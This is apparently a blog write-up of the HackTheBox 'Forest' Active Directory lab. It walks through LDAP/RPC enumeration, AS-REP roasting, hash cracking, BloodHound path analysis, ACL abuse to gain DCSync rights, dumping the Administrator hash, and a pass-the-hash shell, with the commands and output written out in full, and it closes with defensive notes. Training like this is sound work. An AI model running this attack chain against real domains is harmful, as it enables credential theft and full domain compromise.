---
toc: true
comments: true
title: HackTheBox - Forest
layout: post
title: HackTheBox - Forest
date: 2024-07-16 18:28 -0300
categories: [HackTheBox, Easy, CTF]
tags: [Windows, Active Directory, Kerberos, AS-REP Roasting, BloodHound, DCSync, Impacket, PrivEsc]    
image: /assets/Posts/Forest/logo.png
---

## Pre
- Time for the big one: our first **Active Directory** box. If everything so far has been single hosts, Forest is where we start thinking about a *domain*.
- It covers the AD starter pack: LDAP/RPC enumeration, **AS-REP Roasting**, **BloodHound** for attack-path analysis, and a **DCSync** to dump the domain. This is the most "job-relevant" box in the roadmap so far.
- Don't panic at the tooling – underneath, it's the same loop we've done all along: enumerate, find a credential, use it to find the next one.

## Phase 1: Recon
```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
5985/tcp  open  wsman
9389/tcp  open  adws
```

That port profile – `53, 88 (kerberos), 389 (LDAP), 445, 3268, 9389 (ADWS)` – is the unmistakable fingerprint of a **Domain Controller**. The version scan confirms the domain name:

```shell
| smb-os-discovery:
|   OS: Windows Server 2016 Standard
|_  Domain name: htb.local
```

Add `htb.local` to `/etc/hosts` and let's enumerate the directory.

## Phase 2: Enumeration → user list
Windows DCs often allow anonymous RPC/LDAP queries. `rpcclient` with a null session lets us list domain users:

```shell
$ rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[svc-alfresco] rid:[0x47b]
...
```

We scrape that into a `users.txt`. The account `svc-alfresco` stands out – service accounts are frequently misconfigured.

## Phase 3: AS-REP Roasting
Kerberos normally requires **pre-authentication**: you prove you know your password before the KDC gives you anything. If an account has *"Do not require Kerberos pre-authentication"* set, anyone can request an AS-REP for it and receive a chunk of data encrypted with that user's password hash – crackable **offline**, no password needed. That's **AS-REP Roasting**.

Impacket's `GetNPUsers.py` tries every user in our list and returns hashes for the vulnerable ones:

```shell
$ GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161
$krb5asrep$23$svc-alfresco@HTB.LOCAL:a1b2...<snip>
```

Only `svc-alfresco` comes back. Crack it with hashcat mode **18200**:

```shell
$ hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt
$krb5asrep$23$svc-alfresco@HTB.LOCAL:...:s3rvice
```

Password: `s3rvice`. That account is in the *Remote Management Users* group, so we log in over **WinRM** with evil-winrm:

```shell
$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
*Evil-WinRM* PS> type ..\Desktop\user.txt
```

## Phase 4: BloodHound → the path to Domain Admin
Now we map the domain. We run the collector as our foothold user:

```shell
$ bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c All
```

Loading the data into BloodHound and marking `svc-alfresco` as owned, the shortest-path-to-Domain-Admin query reveals the chain:

- `svc-alfresco` → member of **Account Operators**
- Account Operators → **GenericAll** over the **Exchange Windows Permissions** group
- Exchange Windows Permissions → **WriteDACL** on the **domain object** itself

WriteDACL on the domain means we can grant ourselves **DCSync** rights – the ability to ask the DC to replicate password hashes, exactly as a second DC would.

> BloodHound doesn't hack anything; it *shows you the graph*. Every edge it draws is a right some object holds over another. Learning to read those edges (GenericAll, WriteDACL, ForceChangePassword) is the core skill of AD attacking.
{: .prompt-tip }

## Phase 5: Weaponising the path → DCSync
We execute the chain from our evil-winrm session. First, create a user we control and add it to the powerful group (Account Operators lets us do this):

```powershell
PS> net user hacker Passw0rd123! /add /domain
PS> net group "Exchange Windows Permissions" hacker /add
```

Now, using PowerView (`PowerSploit`), grant our user the DCSync replication rights on the domain:

```powershell
PS> $pass = ConvertTo-SecureString 'Passw0rd123!' -AsPlainText -Force
PS> $cred = New-Object System.Management.Automation.PSCredential('htb\hacker',$pass)
PS> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity hacker -Rights DCSync
```

With DCSync rights in hand, we replicate the Administrator hash from our attacking box with Impacket's `secretsdump.py`:

```shell
$ secretsdump.py htb.local/hacker:'Passw0rd123!'@10.10.10.161 -just-dc-user Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

Finally, **pass-the-hash** into a SYSTEM shell (same technique as [Jeeves](/posts/hackthebox-jeeves/)):

```shell
$ psexec.py htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
C:\> whoami
htb\administrator
```

## Conclusions
- Forest is the canonical "intro to AD" box and it's dense with fundamentals: RPC enumeration, AS-REP Roasting, BloodHound path analysis, ACL abuse and DCSync.
- The mental model to keep: in AD, **privilege is a graph of rights between objects**, not a ladder of SUID binaries. BloodHound makes that graph visible.
- Defensive notes: never disable Kerberos pre-auth, keep an eye on the wildly over-privileged Exchange groups, and monitor for unexpected DCSync (replication) requests.
- Next we practise different AD techniques – GPP passwords and Kerberoasting – on [Active](/posts/hackthebox-active/).

_Keep hacking_  🙈🙉🙊
